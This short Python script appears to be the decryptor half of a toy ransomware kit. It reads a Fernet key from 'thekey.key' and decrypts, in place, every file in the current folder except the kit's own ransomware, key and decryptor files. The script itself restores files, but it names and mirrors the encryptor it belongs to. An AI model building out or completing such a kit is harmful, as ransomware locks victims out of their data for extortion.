import os 
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware_polymorphic.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key1:
    secretkey = key1.read()

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_dencrypted = Fernet(secretkey).decrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_dencrypted)
